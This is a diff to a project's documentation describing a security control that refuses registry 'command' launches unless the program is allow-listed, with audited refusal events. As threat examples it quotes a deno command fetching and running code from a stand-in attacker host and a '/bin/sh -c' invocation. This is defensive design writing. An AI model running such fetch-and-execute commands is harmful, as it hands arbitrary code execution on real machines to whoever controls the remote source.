@@ -69,6 +69,18 @@ The **location** is one of two forms:
 > needs no such opt-out. A refused launch is a structured tool error and an
 > audited `launch_origin_not_allowed` event — nothing is spawned. Local modules,
 > which is what `zuke register` writes, are unaffected.
+>
+> **A `command` location is refused the same way**, unless its program is named
+> in `ZUKE_REGISTRY_LAUNCH_COMMANDS` (same spelling; `*` allows any). Its argv is
+> not code already on the machine the way a local module path is — the registry
+> writer picks the program _and its arguments_, so `["deno", "run", "-A",
+> "https://attacker.example/x.ts"]` is the refused module case in command form
+> and `["/bin/sh", "-c", …]` is arbitrary code with no fetch. The entry matches
+> `command[0]` as written or by its trailing path segment (`make` admits
+> `/usr/bin/make`; `/usr/bin/make` admits only itself). Naming a bare program
+> admits any program resolving under that name, and naming an interpreter hands
+> the registry writer full execution — both are the operator's decision to make.
+> A refusal is an audited `launch_command_not_allowed` event.
 
 ## Backends
 
